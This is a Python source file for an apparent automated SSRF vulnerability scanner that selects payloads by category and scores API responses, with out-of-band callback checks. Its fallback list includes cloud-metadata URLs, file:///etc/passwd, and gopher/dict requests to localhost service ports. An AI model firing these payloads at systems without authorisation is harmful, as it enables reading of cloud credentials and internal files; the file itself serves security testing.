import json
from queue import Empty
import requests
import logging
import time
import queue
import hashlib
import threading
from typing import Dict, Any, Tuple, Optional, List
from datetime import datetime, timedelta
from dataclasses import dataclass
from enum import Enum
from django.db import models
from api_orch.models import ScanTokens
from ..models import SSRFCandidate, LLMAnalysisResult, SSRFProof, Payload
from .interactsh_manager import InteractshManager

logger = logging.getLogger(__name__)

class DetectionMethod(Enum):
    OUT_OF_BAND = "out_of_band"
    TIME_BASED = "time_based"
    ERROR_BASED = "error_based"
    CONTENT_BASED = "content_based"
    BEHAVIOR_BASED = "behavior_based"

@dataclass
class OutOfBandServer:
    """Configuration for out-of-band detection server"""
    domain: str
    verification_client: Any
    dns_log_endpoint: str
    http_log_endpoint: str
    api_key: str

@dataclass
class SSRFEvidence:
    """Structured evidence for SSRF detection"""
    method: DetectionMethod
    confidence: float
    evidence_data: Dict[str, Any]
    description: str

# # Model for storing SSRF payloads
# class SSRFPayload(models.Model):
#     category = models.CharField(max_length=50)
#     payload = models.TextField()
#     created_at = models.DateTimeField(auto_now_add=True)
    
#     class Meta:
#         db_table = 'ssrf_payload'

class PayloadManager:
    """Manages SSRF payloads from database and provides intelligent payload selection"""
    
    def __init__(self):
        self.payload_cache = {}
        self.payload_stats = {}
        self._load_payloads()
    
    def _load_payloads(self):
        """Load and cache payloads from database with statistics"""
        try:
            # --- FIX: Query the correct 'Payload' model ---
            payloads = Payload.objects.all().values('category', 'payload')
            total_payloads = 0
            
            for payload_obj in payloads:
                category = payload_obj['category']
                payload = payload_obj['payload']
                
                if category not in self.payload_cache:
                    self.payload_cache[category] = []
                self.payload_cache[category].append(payload)
                total_payloads += 1
            
            # Generate statistics
            self.payload_stats = {
                'total_payloads': total_payloads,
                'categories': list(self.payload_cache.keys()),
                'category_counts': {cat: len(payloads) for cat, payloads in self.payload_cache.items()}
            }
            
            logger.info(f"Loaded {total_payloads} SSRF payloads across {len(self.payload_cache)} categories:")
            for category, count in self.payload_stats['category_counts'].items():
                logger.info(f"  {category}: {count} payloads")
                
        except Exception as e:
            logger.error(f"Error loading payloads from database: {e}")
            self._use_fallback_payloads()
    
    def _use_fallback_payloads(self):
        """Fallback payloads if database is unavailable"""
        self.payload_cache = {
            'cloud_metadata': [
                'http://169.254.169.254/latest/meta-data/',
                'http://100.100.100.200/latest/meta-data/',
                'http://metadata.google.internal/computeMetadata/v1/'
            ],
            'local_ips': [
                'http://127.0.0.1/',
                'http://localhost/',
                'http://[::1]/',
                'http://0.0.0.0/'
            ],
            'dns_rebinding': [
                'http://127.0.0.1.nip.io/',
                'http://127.0.0.1.xip.io/',
                'http://127.0.0.1.localtest.me/'
            ],
            'protocols': [
                'file:///etc/passwd',
                'dict://127.0.0.1:11211/',
                'gopher://127.0.0.1:11211/',
                'ftp://127.0.0.1/'
            ]
        }
    
    def get_payloads_by_category(self, category: str) -> List[str]:
        """Get payloads by category"""
        return self.payload_cache.get(category, [])
    
    def get_payloads_by_categories(self, categories: List[str], limit_per_category: int = 3) -> List[str]:
        """Get payloads from multiple categories with smart limiting for large datasets"""
        payloads = []
        for category in categories:
            category_payloads = self.get_payloads_by_category(category)
            
            # For large payload sets, use smart selection
            if len(category_payloads) > limit_per_category:
                selected_payloads = self._smart_payload_selection(category_payloads, limit_per_category)
            else:
                selected_payloads = category_payloads
                
            payloads.extend(selected_payloads)
        return payloads
    
    def _smart_payload_selection(self, payloads: List[str], limit: int) -> List[str]:
        """Smart selection strategy for large payload sets"""
        if len(payloads) <= limit:
            return payloads
        
        selected = []
        
        # Strategy 1: Prioritize high-impact payloads
        high_priority = []
        medium_priority = []
        low_priority = []
        
        for payload in payloads:
            priority_score = self._calculate_payload_priority(payload)
            if priority_score >= 8:
                high_priority.append(payload)
            elif priority_score >= 5:
                medium_priority.append(payload)
            else:
                low_priority.append(payload)
        
        # Select from high priority first
        remaining_slots = limit
        if high_priority and remaining_slots > 0:
            take = min(len(high_priority), max(1, remaining_slots // 2))
            selected.extend(high_priority[:take])
            remaining_slots -= take
        
        # Then medium priority
        if medium_priority and remaining_slots > 0:
            take = min(len(medium_priority), remaining_slots)
            selected.extend(medium_priority[:take])
            remaining_slots -= take
        
        # Fill remaining with low priority if needed
        if remaining_slots > 0 and low_priority:
            selected.extend(low_priority[:remaining_slots])
        
        # Ensure we have at least 'limit' payloads
        if len(selected) < limit:
            remaining = [p for p in payloads if p not in selected]
            selected.extend(remaining[:limit - len(selected)])
        
        return selected[:limit]
    
    def _calculate_payload_priority(self, payload: str) -> int:
        """Calculate payload priority score (1-10)"""
        score = 5  # Base score
        payload_lower = payload.lower()
        
        # High priority indicators
        if '169.254.169.254' in payload:  # AWS metadata
            score += 3
        if 'computemetadata' in payload_lower:  # GCP metadata
            score += 3
        if any(proto in payload for proto in ['file://', 'dict://', 'gopher://']):
            score += 2
        if 'localhost' in payload_lower or '127.0.0.1' in payload:
            score += 2
        if '.nip.io' in payload or '.xip.io' in payload:
            score += 1
        
        # Encoding variations (useful for bypasses)
        if payload.startswith('%') or 'aHR0' in payload:
            score += 1
        
        # Port-specific payloads
        if any(port in payload for port in [':22', ':3306', ':6379', ':27017']):
            score += 1
        
        return min(score, 10)
    
    def get_progressive_payloads(self, component: Dict, llm_category: Optional[str] = None, 
                               max_total: int = 15) -> List[Dict[str, Any]]:
        """Get payloads in progressive testing order with metadata"""
        progressive_payloads = []
        
        # Phase 1: LLM recommended category (highest priority)
        if llm_category and llm_category in self.payload_cache:
            category_payloads = self.get_payloads_by_category(llm_category)
            selected = self._smart_payload_selection(category_payloads, min(5, max_total // 3))
            for payload in selected:
                progressive_payloads.append({
                    'payload': payload,
                    'category': llm_category,
                    'phase': 1,
                    'priority': 'high',
                    'reasoning': 'LLM recommended category'
                })
        
        # Phase 2: Location-specific high-impact payloads
        location = component.get('location', '')
        phase2_categories = self._get_location_categories(location)
        remaining_slots = max_total - len(progressive_payloads)
        
        if remaining_slots > 0:
            phase2_payloads = self.get_payloads_by_categories(
                phase2_categories, 
                max(1, remaining_slots // len(phase2_categories)) if phase2_categories else 0
            )
            for payload in phase2_payloads[:remaining_slots]:
                if payload not in [p['payload'] for p in progressive_payloads]:
                    progressive_payloads.append({
                        'payload': payload,
                        'category': self._identify_payload_category(payload),
                        'phase': 2,
                        'priority': 'medium',
                        'reasoning': f'Location-specific for {location}'
                    })
        
        # Phase 3: Diverse coverage (fill remaining slots)
        remaining_slots = max_total - len(progressive_payloads)
        if remaining_slots > 0:
            all_categories = list(self.payload_cache.keys())
            tested_categories = set(p['category'] for p in progressive_payloads)
            untested_categories = [cat for cat in all_categories if cat not in tested_categories]
            
            if untested_categories:
                phase3_payloads = self.get_payloads_by_categories(
                    untested_categories, 
                    max(1, remaining_slots // len(untested_categories))
                )
                for payload in phase3_payloads[:remaining_slots]:
                    progressive_payloads.append({
                        'payload': payload,
                        'category': self._identify_payload_category(payload),
                        'phase': 3,
                        'priority': 'low',
                        'reasoning': 'Diverse coverage'
                    })
        
        return progressive_payloads[:max_total]
    
    def get_targeted_payloads(self, component: Dict, llm_category: Optional[str] = None, 
                             max_payloads: int = 12) -> List[str]:
        """Get targeted payloads with intelligent selection for large payload sets"""
        
        # Use progressive payload selection for better coverage
        progressive_payloads = self.get_progressive_payloads(component, llm_category, max_payloads)
        
        # Extract just the payload strings
        payloads = [p['payload'] for p in progressive_payloads]
        
        # Log selection strategy for debugging
        logger.info(f"Selected {len(payloads)} payloads for {component.get('injection_point')}:")
        phase_counts = {}
        for p in progressive_payloads:
            phase = p['phase']
            phase_counts[phase] = phase_counts.get(phase, 0) + 1
        
        for phase, count in sorted(phase_counts.items()):
            logger.info(f"  Phase {phase}: {count} payloads")
        
        return payloads
    
    def _get_location_categories(self, location: str) -> List[str]:
        """Get categories most relevant for specific injection locations"""
        location_mapping = {
            'header': ['headers', 'local_ips', 'dns_rebinding'],
            'query': ['cloud_metadata', 'local_ips', 'protocols', 'dns_rebinding'],
            'body': ['cloud_metadata', 'local_ips', 'protocols', 'dns_rebinding', 'encoded'],
            'path': ['encoded', 'local_ips', 'waf_bypass']
        }
        return location_mapping.get(location, ['local_ips', 'cloud_metadata'])
    
    def _identify_payload_category(self, payload: str) -> str:
        """Identify category of a payload based on its content"""
        # Search through cached payloads to find the category
        for category, payloads in self.payload_cache.items():
            if payload in payloads:
                return category
        
        # Fallback to content-based identification
        return self._get_payload_category_by_content(payload)
    
    def _get_payload_category_by_content(self, payload: str) -> str:
        """Determine payload category based on content analysis"""
        payload_lower = payload.lower()
        
        if '169.254.169.254' in payload or 'metadata' in payload:
            return 'cloud_metadata'
        elif '127.0.0.1' in payload or 'localhost' in payload or '::1' in payload:
            return 'local_ips'
        elif '.nip.io' in payload or '.xip.io' in payload or 'localtest.me' in payload:
            return 'dns_rebinding'
        elif payload.startswith('%') or 'aHR0' in payload:
            return 'encoded'
        elif any(proto in payload for proto in ['file://', 'dict://', 'gopher://', 'ftp://']):
            return 'protocols'
        elif any(header in payload_lower for header in ['client-ip', 'x-forwarded', 'host']):
            return 'headers'
        elif ':' in payload and any(port in payload for port in [':80', ':443', ':22', ':3306']):
            return 'ports'
        elif any(bypass in payload for bypass in ['%253A', '%2F%2F', 'http%3A']):
            return 'waf_bypass'
        elif '/redirect' in payload or '/out' in payload or 'callback' in payload:
            return 'parameters'
        else:
            return 'unknown'
    
    def get_payload_statistics(self) -> Dict[str, Any]:
        """Get comprehensive payload statistics"""
        return self.payload_stats

class EnhancedSSRFAnalyzer:
    """
    Enhanced SSRF analyzer with database payload integration and intelligent testing
    """
    
    def __init__(self, candidate: SSRFCandidate, llm_analysis: LLMAnalysisResult, 
             oob_server: Optional[OutOfBandServer] = None, analysis_run_id: str = None):
            self.candidate = candidate
            self.llm_analysis = llm_analysis
            self.api_info = candidate.api
            self.scan_id = candidate.api.scan.id
            self.scan_token_obj = self._get_scan_token_obj()
            self.auth_token = self.scan_token_obj.access_token if self.scan_token_obj else None
            self.oob_server = oob_server
            self.session = requests.Session()
            self.baseline_responses = {}
            self.payload_manager = PayloadManager()
            self.analysis_run_id = analysis_run_id
            
            # NEW: Initialize interactsh manager
            self.interactsh_manager = None
            self._setup_interactsh()
            
            # Configure session with reasonable defaults
            self.session.timeout = (5, 10)
            self.session.max_redirects = 3
    def _setup_interactsh(self):
        """Setup interactsh manager"""
        try:
            self.interactsh_manager = InteractshManager()
            if self.interactsh_manager.start_client():
                domain = self.interactsh_manager.get_domain_url()
                if domain:
                    logger.info(f"Interactsh initialized with domain: {domain}")
                else:
                    logger.warning("Could not get interactsh domain")
                    self.interactsh_manager = None
            else:
                logger.warning("Failed to start interactsh client")
                self.interactsh_manager = None
        except Exception as e:
            logger.error(f"Error setting up interactsh: {e}")
            self.interactsh_manager = None

    def _get_scan_token_obj(self) -> Optional[ScanTokens]:
        try:
            return ScanTokens.objects.get(scan_id=self.scan_id)
        except ScanTokens.DoesNotExist:
            logger.warning(f"No authentication tokens found for scan_id: {self.scan_id}")
            return None
        
    def _poll_interactsh_interactions_threaded(self, timeout=7) -> List[Dict]:
        """
        DEPRECATED: This method is replaced by InteractshManager
        """
        logger.warning("_poll_interactsh_interactions_threaded is deprecated, use InteractshManager instead")
        return []

    def _test_out_of_band(self, component: Dict, baseline: Dict) -> Optional[SSRFEvidence]:
        """
        Fixed out-of-band testing compatible with InteractshManager
        """
        if not self.oob_server or not self.oob_server.verification_client:
            logger.debug("OOB server or verification client not configured, skipping OOB test")
            return None

        # Check if we have the new InteractshManager or old process
        verification_client = self.oob_server.verification_client
        
        # Generate unique identifier
        unique_id = f"c{self.candidate.id}-{component.get('injection_point', 'ssrf').replace('.', '-')}-{int(time.time())}"
        
        # Get domain from oob_server config
        base_domain = self.oob_server.domain
        if not base_domain:
            logger.error("Could not get interactsh domain from OOB server config")
            return None

        interactsh_url = f"http://{unique_id}.{base_domain}"
        logger.info(f"Using unique Interactsh URL: {interactsh_url}")

        try:
            start_time = time.time()
            request_details = self._prepare_request(component, interactsh_url)
            response = self.session.request(**request_details, timeout=10)
            duration = time.time() - start_time

            # Check if we're using the new InteractshManager
            if hasattr(verification_client, 'wait_for_interactions'):
                # New InteractshManager method
                interactions = verification_client.wait_for_interactions(unique_id, timeout=7)
            else:
                # Fallback to old method (if still using subprocess)
                interactions = self._poll_interactsh_interactions_threaded(timeout=7)

            if interactions:
                logger.info(f"Confirmed OOB interaction for {interactsh_url}")
                return SSRFEvidence(
                    method=DetectionMethod.OUT_OF_BAND,
                    confidence=0.95,
                    evidence_data={
                        "payload": interactsh_url,
                        "response_status": response.status_code,
                        "duration": duration,
                        "component": component.get('injection_point'),
                        "interaction_details": interactions[0] if interactions else None,
                        "all_interactions": interactions
                    },
                    description=f"Out-of-band interaction confirmed via {base_domain}"
                )

            logger.info(f"No OOB interaction detected for {interactsh_url}")
            return None

        except requests.RequestException as e:
            logger.error(f"Request failed during out-of-band test: {e}")
            return None

    def __del__(self):
        """Cleanup resources"""
        if hasattr(self, 'session'):
            self.session.close()
    
    # NEW: Cleanup interactsh manager
        if hasattr(self, 'interactsh_manager') and self.interactsh_manager:
            self.interactsh_manager.stop_client()
    
    def run_analysis(self) -> List[SSRFProof]:
        """Enhanced analysis with database payload integration"""
        if not self.llm_analysis.is_ssrf_candidate:
            return []

        confirmed_proofs = []
        
        for component in self.candidate.vulnerable_components:
            try:
                # Step 1: Establish behavioral baseline
                baseline = self._establish_baseline(component)
                if not baseline:
                    logger.warning(f"Could not establish baseline for {component.get('injection_point')}")
                    continue
                
                # Step 2: Run detection methods with database payloads
                evidence_list = []
                
                # Get LLM recommended payload category
                llm_category = getattr(self.llm_analysis, 'primary_payload_category', None)
                
                # Out-of-band detection (most reliable)
                if self.oob_server:
                    oob_evidence = self._test_out_of_band(component, baseline)
                    if oob_evidence:
                        evidence_list.append(oob_evidence)
                
                # Database payload testing (main enhancement)
                if not evidence_list:  # Only if OOB didn't find anything
                    db_evidence = self._test_database_payloads(component, baseline, llm_category)
                    if db_evidence:
                        evidence_list.append(db_evidence)
                
                # Behavior-based detection with targeted payloads
                if not evidence_list:
                    behavior_evidence = self._test_behavioral_changes_enhanced(component, baseline, llm_category)
                    if behavior_evidence:
                        evidence_list.append(behavior_evidence)
                
                # Content-based detection
                # content_evidence = self._test_content_changes(component, baseline)
                # if content_evidence:
                #     evidence_list.append(content_evidence)
                
                # Time-based detection (least reliable)
                if not evidence_list:
                    time_evidence = self._test_time_based_enhanced(component, baseline)
                    if time_evidence:
                        evidence_list.append(time_evidence)
                
                # Step 3: Validate and create proofs
                for evidence in evidence_list:
                    if evidence.confidence >= 0.7:
                        proof = self._create_validated_proof(component, evidence, baseline)
                        confirmed_proofs.append(proof)
                        break
                        
            except Exception as e:
                logger.error(f"Error analyzing component {component.get('injection_point')}: {e}")
                continue
        
        return confirmed_proofs

    def _test_database_payloads(self, component: Dict, baseline: Dict, 
                               llm_category: Optional[str] = None) -> Optional[SSRFEvidence]:
        """Enhanced testing using progressive payload selection for large datasets"""
        
        # Get progressive payloads (optimized for 258 payloads)
        progressive_payloads = self.payload_manager.get_progressive_payloads(
            component, llm_category, max_total=15
        )
        
        if not progressive_payloads:
            logger.warning("No database payloads available for testing")
            return None
        
        logger.info(f"Testing {len(progressive_payloads)} optimally selected payloads for {component.get('injection_point')}")
        
        # Test payloads in phases for early detection
        for phase in [1, 2, 3]:
            phase_payloads = [p for p in progressive_payloads if p['phase'] == phase]
            
            if not phase_payloads:
                continue
                
            logger.info(f"Phase {phase}: Testing {len(phase_payloads)} {phase_payloads[0]['priority']} priority payloads")
            
            for payload_info in phase_payloads:
                payload = payload_info['payload']
                category = payload_info['category']
                
                try:
                    # Prepare the payload based on component location
                    test_payload = self._prepare_payload_for_location(payload, component)
                    
                    request_details = self._prepare_request(component, test_payload)
                    start_time = time.time()
                    response = self.session.request(**request_details, timeout=15)
                    duration = time.time() - start_time
                    
                    # Enhanced analysis with payload context
                    evidence_score, evidence_details = self._analyze_response_for_ssrf_enhanced(
                        response, payload, category, baseline, duration
                    )
                    
                    # Early detection - if we find strong evidence, stop testing
                    if evidence_score >= 0.8:
                        logger.info(f"High confidence SSRF detected with {category} payload in phase {phase}")
                        return SSRFEvidence(
                            method=DetectionMethod.BEHAVIOR_BASED,
                            confidence=evidence_score,
                            evidence_data={
                                "payload": str(test_payload),
                                "original_payload": payload,
                                "payload_category": category,
                                "payload_phase": phase,
                                "payload_priority": payload_info['priority'],
                                "payload_reasoning": payload_info['reasoning'],
                                "response_status": response.status_code,
                                "response_length": len(response.text),
                                "duration": duration,
                                "evidence_details": evidence_details,
                                "response_snippet": response.text[:500]
                            },
                            description=f"Database payload evidence (Phase {phase}): {payload}"
                        )
                    
                    # Medium confidence - continue testing but record
                    elif evidence_score >= 0.7:
                        logger.info(f"Medium confidence evidence found with {category} payload")
                        # Continue testing but this is a good candidate
                        medium_confidence_evidence = SSRFEvidence(
                            method=DetectionMethod.BEHAVIOR_BASED,
                            confidence=evidence_score,
                            evidence_data={
                                "payload": str(test_payload),
                                "original_payload": payload,
                                "payload_category": category,
                                "payload_phase": phase,
                                "response_status": response.status_code,
                                "response_length": len(response.text),
                                "duration": duration,
                                "evidence_details": evidence_details,
                                "response_snippet": response.text[:500]
                            },
                            description=f"Database payload evidence (Phase {phase}): {payload}"
                        )
                    
                    # Rate limiting between requests (important for large payload sets)
                    time.sleep(0.3)
                    
                except requests.Timeout:
                    # Timeout analysis based on payload type
                    if self._is_timeout_significant(payload, category):
                        return SSRFEvidence(
                            method=DetectionMethod.TIME_BASED,
                            confidence=0.65,
                            evidence_data={
                                "payload": str(payload),
                                "payload_category": category,
                                "timeout_occurred": True,
                                "timeout_analysis": "Significant timeout for this payload type"
                            },
                            description=f"Timeout evidence with {category} payload: {payload}"
                        )
                    continue
                except requests.RequestException as e:
                    logger.debug(f"Request failed for {category} payload {payload}: {e}")
                    continue
            
            # If we found medium confidence evidence and completed the phase, return it
            if 'medium_confidence_evidence' in locals():
                logger.info(f"Returning medium confidence evidence after phase {phase}")
                return medium_confidence_evidence
        
        return None
    
    def _analyze_response_for_ssrf_enhanced(self, response: requests.Response, payload: str, 
                                          category: str, baseline: Dict, duration: float) -> Tuple[float, Dict]:
        """Enhanced analysis with category-specific detection logic"""
        evidence_score = 0.0
        evidence_details = {}
        
        # Category-specific analysis
        if category == 'cloud_metadata':
            if self._is_metadata_response(response):
                evidence_score += 0.9
                evidence_details["cloud_metadata_detected"] = True
        
        elif category == 'local_ips':
            if self._check_local_service_response(response):
                evidence_score += 0.8
                evidence_details["local_service_detected"] = True
        
        elif category == 'protocols':
            if self._check_protocol_response(response, payload):
                evidence_score += 0.85
                evidence_details["protocol_response"] = True
        
        elif category == 'dns_rebinding':
            if self._check_dns_rebinding_success(response, payload):
                evidence_score += 0.75
                evidence_details["dns_rebinding_success"] = True
        
        elif category == 'encoded':
            if self._check_encoding_bypass_success(response, payload, baseline):
                evidence_score += 0.7
                evidence_details["encoding_bypass"] = True
        
        # General checks
        if self._contains_service_indicators(response.text):
            evidence_score += 0.4
            evidence_details["service_indicators"] = True
        
        if self._is_unusual_response(response, baseline):
            evidence_score += 0.2
            evidence_details["unusual_response"] = True
        
        if self._check_internal_access_errors(response.text):
            evidence_score += 0.3
            evidence_details["internal_access_errors"] = True
        
        # Time-based evidence
        if duration > 5 and any(keyword in payload.lower() for keyword in ['delay', 'timeout']):
            evidence_score += 0.4
            evidence_details["time_based_evidence"] = True
        
        return min(evidence_score, 0.95), evidence_details
    
    def _is_timeout_significant(self, payload: str, category: str) -> bool:
        """Determine if timeout is significant based on payload type"""
        timeout_significant_categories = ['protocols', 'local_ips', 'dns_rebinding']
        return category in timeout_significant_categories
    
    def _check_local_service_response(self, response: requests.Response) -> bool:
        """Check for local service-specific responses"""
        local_service_indicators = [
            'ssh-', 'mysql', 'postgresql', 'redis-server', 'mongodb',
            'connection refused', 'connection timeout', 'port 22', 'port 3306'
        ]
        text_lower = response.text.lower()
        return any(indicator in text_lower for indicator in local_service_indicators)
    
    def _check_dns_rebinding_success(self, response: requests.Response, payload: str) -> bool:
        """Check for successful DNS rebinding"""
        # Look for signs that the rebinding worked
        if response.status_code == 200 and len(response.text) > 0:
            # If we got content from what should resolve to localhost
            if any(domain in payload for domain in ['.nip.io', '.xip.io', 'localtest.me']):
                return True
        return False
    
    def _check_encoding_bypass_success(self, response: requests.Response, payload: str, baseline: Dict) -> bool:
        """Check if encoding bypass was successful"""
        # Compare with baseline - if encoded payload produces different result, it might have bypassed filters
        if self._is_unusual_response(response, baseline):
            # Additional checks for encoding success
            if response.status_code not in [400, 403, 404]:  # Not blocked by WAF/filters
                return True
        return False

    def _prepare_payload_for_location(self, payload: str, component: Dict) -> Any:
        """Prepare payload based on component location and type"""
        location = component.get('location', '')
        
        # Handle header-based payloads
        if location == 'header':
            # Check if payload is already in header format
            if payload.startswith('http') or payload.startswith('https'):
                return payload
            # For encoded payloads in headers, use as-is
            elif payload.startswith('%') or payload.startswith('aHR0'):
                return payload
            # For special header values
            else:
                return payload
        
        # Handle encoded payloads for different locations
        elif location in ['query', 'body', 'path']:
            return payload
        
        return payload

    def _get_payload_category(self, payload: str) -> str:
        """Determine payload category based on content"""
        payload_lower = payload.lower()
        
        if '169.254.169.254' in payload or 'metadata' in payload:
            return 'cloud_metadata'
        elif '127.0.0.1' in payload or 'localhost' in payload or '::1' in payload:
            return 'local_ips'
        elif '.nip.io' in payload or '.xip.io' in payload or 'localtest.me' in payload:
            return 'dns_rebinding'
        elif payload.startswith('%') or 'aHR0' in payload:
            return 'encoded'
        elif any(proto in payload for proto in ['file://', 'dict://', 'gopher://', 'ftp://']):
            return 'protocols'
        elif 'client-ip' in payload_lower or 'x-forwarded' in payload_lower:
            return 'headers'
        elif ':' in payload and any(port in payload for port in [':80', ':443', ':22', ':3306']):
            return 'ports'
        else:
            return 'unknown'

    def _analyze_response_for_ssrf(self, response: requests.Response, payload: str, 
                                  baseline: Dict, duration: float) -> Tuple[float, Dict]:
        """Analyze response for SSRF evidence with scoring"""
        evidence_score = 0.0
        evidence_details = {}
        
        # Check for metadata service responses
        if self._is_metadata_response(response):
            evidence_score += 0.8
            evidence_details["metadata_response"] = True
        
        # Check for service banners or error messages
        if self._contains_service_indicators(response.text):
            evidence_score += 0.6
            evidence_details["service_indicators"] = True
        
        # Check for protocol-specific responses
        if self._check_protocol_response(response, payload):
            evidence_score += 0.7
            evidence_details["protocol_response"] = True
        
        # Check for unusual response patterns
        if self._is_unusual_response(response, baseline):
            evidence_score += 0.3
            evidence_details["unusual_response"] = True
        
        # Check for error messages that indicate internal access
        if self._check_internal_access_errors(response.text):
            evidence_score += 0.5
            evidence_details["internal_access_errors"] = True
        
        # Time-based evidence
        if duration > 5 and 'delay' in payload.lower():
            evidence_score += 0.4
            evidence_details["time_based_evidence"] = True
        
        return min(evidence_score, 0.95), evidence_details

    def _check_protocol_response(self, response: requests.Response, payload: str) -> bool:
        """Check for protocol-specific response patterns"""
        response_text = response.text.lower()
        
        # File protocol responses
        if payload.startswith('file://'):
            return any(indicator in response_text for indicator in [
                'root:', '/bin/', '/etc/', 'password', 'shadow'
            ])
        
        # Dict protocol responses
        elif 'dict://' in payload:
            return 'version' in response_text or 'stats' in response_text
        
        # Gopher protocol responses
        elif 'gopher://' in payload:
            return len(response.text) > 0 and response.status_code == 200
        
        return False

    def _check_internal_access_errors(self, response_text: str) -> bool:
        """Check for error messages indicating internal service access"""
        error_indicators = [
            'connection refused', 'connection timeout', 'network unreachable',
            'internal server error', 'bad gateway', 'service unavailable',
            'authentication required', 'unauthorized', 'forbidden',
            'mysql', 'postgresql', 'redis', 'mongodb', 'elasticsearch'
        ]
        
        text_lower = response_text.lower()
        return any(indicator in text_lower for indicator in error_indicators)

    def _test_behavioral_changes_enhanced(self, component: Dict, baseline: Dict, 
                                        llm_category: Optional[str] = None) -> Optional[SSRFEvidence]:
        """Enhanced behavioral testing with database payloads"""
        
        # Get metadata-specific payloads for behavioral testing
        metadata_payloads = self.payload_manager.get_payloads_by_category('cloud_metadata')
        
        for payload in metadata_payloads[:5]:  # Test top 5 metadata payloads
            try:
                request_details = self._prepare_request(component, payload)
                start_time = time.time()
                response = self.session.request(**request_details, timeout=15)
                duration = time.time() - start_time
                
                evidence_score, evidence_details = self._analyze_response_for_ssrf(
                    response, payload, baseline, duration
                )
                
                if evidence_score >= 0.6:
                    return SSRFEvidence(
                        method=DetectionMethod.BEHAVIOR_BASED,
                        confidence=evidence_score,
                        evidence_data={
                            "payload": payload,
                            "response_status": response.status_code,
                            "response_length": len(response.text),
                            "duration": duration,
                            "evidence_details": evidence_details,
                            "response_snippet": response.text[:500]
                        },
                        description=f"Enhanced behavioral evidence: {payload}"
                    )
                        
            except requests.RequestException:
                continue
                
        return None

    def _test_time_based_enhanced(self, component: Dict, baseline: Dict) -> Optional[SSRFEvidence]:
        """Enhanced time-based testing with database payloads"""
        
        # Get time-based payloads if available in database
        time_payloads = []
        all_payloads = self.payload_manager.get_payloads_by_categories(['protocols', 'local_ips'])
        
        # Look for delay-causing payloads
        for payload in all_payloads:
            if any(keyword in payload.lower() for keyword in ['delay', 'sleep', 'timeout']):
                time_payloads.append(payload)
        
        # Fallback to hardcoded delay payloads
        if not time_payloads:
            time_payloads = [
                "http://httpbin.org/delay/5",
                "http://httpbin.org/delay/3"
            ]
        
        for payload in time_payloads:
            durations = []
            
            for _ in range(3):
                try:
                    request_details = self._prepare_request(component, payload)
                    start_time = time.time()
                    response = self.session.request(**request_details, timeout=20)
                    duration = time.time() - start_time
                    durations.append(duration)
                    time.sleep(1)
                    
                except requests.Timeout:
                    durations.append(20)
                except requests.RequestException:
                    continue
            
            if durations:
                avg_duration = sum(durations) / len(durations)
                
                # Check if duration indicates successful SSRF
                if avg_duration > 3:  # Significant delay
                    return SSRFEvidence(
                        method=DetectionMethod.TIME_BASED,
                        confidence=0.6,
                        evidence_data={
                            "payload": payload,
                            "observed_durations": durations,
                            "average_duration": avg_duration
                        },
                        description=f"Time-based evidence with database payload: {payload}"
                    )
        
        return None

    # ... (keep all other existing methods from the original class)
    
    def _establish_baseline(self, component: Dict) -> Optional[Dict]:
        """Establish behavioral baseline with multiple legitimate requests"""
        baselines = []
        
        legitimate_values = [
            "https://httpbin.org/status/200",
            "example.com",
            "invalid-domain-xyz.com",
            "127.0.0.1:65535",
        ]
        
        for value in legitimate_values:
            try:
                request_details = self._prepare_request(component, value)
                start_time = time.time()
                response = self.session.request(**request_details)
                duration = time.time() - start_time
                
                baseline = {
                    "test_value": value,
                    "status_code": response.status_code,
                    "response_length": len(response.text),
                    "duration": duration,
                    "headers": dict(response.headers),
                    "response_hash": hashlib.md5(response.text.encode()).hexdigest(),
                    "response_snippet": response.text[:200]
                }
                baselines.append(baseline)
                time.sleep(0.5)
                
            except requests.RequestException as e:
                logger.debug(f"Baseline request failed for {value}: {e}")
                continue
        
        if not baselines:
            return None
            
        return {
            "samples": baselines,
            "common_status": self._most_common([b["status_code"] for b in baselines]),
            "avg_length": sum(b["response_length"] for b in baselines) / len(baselines),
            "avg_duration": sum(b["duration"] for b in baselines) / len(baselines),
            "response_patterns": [b["response_hash"] for b in baselines]
        }

    # ... (include all other helper methods from original class)
    
    def _prepare_request(self, component: Dict[str, Any], payload: Any) -> Dict[str, Any]:
        """Prepare request with proper error handling"""
        method = self.api_info.method
        url = self.api_info.url
        headers = dict(self.api_info.headers or {})
        body = json.loads(self.api_info.body.get('raw', '{}')) if self.api_info.body else {}
        
        if self.api_info.authorization and self.auth_token:
            headers['Authorization'] = f"Bearer {self.auth_token}"
        
        headers['User-Agent'] = 'Mozilla/5.0 (compatible; SecurityScanner/1.0)'
        
        location = component.get('location')
        injection_point = component.get('injection_point')
        
        if location == 'header':
            if isinstance(payload, dict) and 'header' in payload and 'value' in payload:
                headers[payload['header']] = payload['value']
            else:
                headers[injection_point] = str(payload)
        elif location == 'query':
            separator = '&' if '?' in url else '?'
            url = f"{url}{separator}{injection_point}={payload}"
        elif location == 'path':
            original_value = component.get('original_value', '')
            url = url.replace(original_value, str(payload))
        elif location == 'body':
            keys = injection_point.split('.')
            current = body
            for key in keys[:-1]:
                current = current.setdefault(key, {})
            current[keys[-1]] = payload
        
        return {
            "method": method,
            "url": url,
            "headers": headers,
            "json": body if body else None,
            "allow_redirects": False,
            "verify": False
        }

    def _most_common(self, items: List) -> Any:
        """Return most common item in list"""
        if not items:
            return None
        return max(set(items), key=items.count)

    def _is_metadata_response(self, response: requests.Response) -> bool:
        """Check if response indicates metadata service access"""
        metadata_indicators = [
            "ami-id", "instance-id", "security-groups", "iam/security-credentials",
            "computeMetadata", "project/project-id", "instance/service-accounts",
            "Azure-IMDS", "metadata/instance"
        ]
        
        response_text = response.text.lower()
        return any(indicator.lower() in response_text for indicator in metadata_indicators)

    def _contains_service_indicators(self, response_text: str) -> bool:
        """Check for service banners or error messages"""
        service_indicators = [
            "ssh-", "mysql", "postgresql", "redis", "mongodb",
            "apache", "nginx", "iis", "tomcat", "jetty"
        ]
        
        text_lower = response_text.lower()
        return any(indicator in text_lower for indicator in service_indicators)

    def _contains_external_content(self, response_text: str, payload: str) -> bool:
        """Check if response contains expected external content"""
        if "httpbin.org/json" in payload:
            return "slideshow" in response_text and "title" in response_text
        elif "httpbin.org/html" in payload:
            return "<!DOCTYPE html>" in response_text and "Herman Melville" in response_text
        elif "httpbin.org/xml" in payload:
            return "<?xml version=" in response_text
        return False

    def _is_unusual_response(self, response: requests.Response, baseline: Dict) -> bool:
        """Check if response is unusual compared to baseline"""
        response_hash = hashlib.md5(response.text.encode()).hexdigest()
        
        if response_hash not in baseline.get("response_patterns", []):
            if response.status_code != baseline.get("common_status"):
                return True
                
        return False

